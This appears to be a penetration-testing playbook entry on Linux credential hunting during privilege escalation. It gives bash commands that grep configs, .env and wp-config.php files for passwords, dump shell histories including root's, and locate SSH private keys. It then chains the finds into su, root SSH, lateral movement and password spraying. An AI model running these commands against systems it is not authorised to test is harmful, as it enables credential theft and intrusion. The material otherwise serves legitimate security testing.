---
id: linux-cred-hunting
title: Linux Credential Hunting
stage: privesc
tags: [linux]
summary: Search config files, shell history, and SSH keys for credentials — database passwords in web configs are frequently reused as system passwords.
leads_to:
  - linux-sudo
  - root-linux
  - ssh-access
---

## Prerequisites

A low-privilege shell with read access to `/var/www/`, `/opt/`, and home directories. This runs in parallel with other privesc checks — start the find commands and let them run while you check sudo/SUID.

Credentials found in one place almost always reappear somewhere else. A MySQL password in a PHP config might also be the system user's password or the SSH passphrase. Shell history reveals commands typed as root during testing. SSH keys found in one home directory often unlock access to other machines.

## Quick Win

> Shell history and web app configs are the fastest wins — check these before the long find commands.

```bash
cat ~/.bash_history
cat ~/.zsh_history
grep -rn "password" /var/www/ 2>/dev/null | grep -v ".pyc" | head -30
```

## Config Files

> Web app configs almost always contain database credentials — check all of them.

```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null \
  | xargs grep -li "password" 2>/dev/null

find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null
grep -rn "password" /opt/ 2>/dev/null | head -20
```

## Shell History

> Admins frequently type passwords directly in commands — history captures them all.

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
cat /root/.bash_history 2>/dev/null
```

## SSH Keys

> A private key found anywhere can unlock SSH access to other hosts in the network.

```bash
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
```

## Database Files

> SQLite and embedded databases often store credentials outside of web application configs.

```bash
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

## Leads To

Database password found → try it as the current user's sudo password → linux-sudo. SSH private key found → `ssh -i id_rsa root@$TARGET` or lateral movement to other hosts. System user password in config → `su root` or `sudo -i`. `/etc/shadow` readable (via SUID or capability) → crack hashes offline → root-linux or password spray across network.
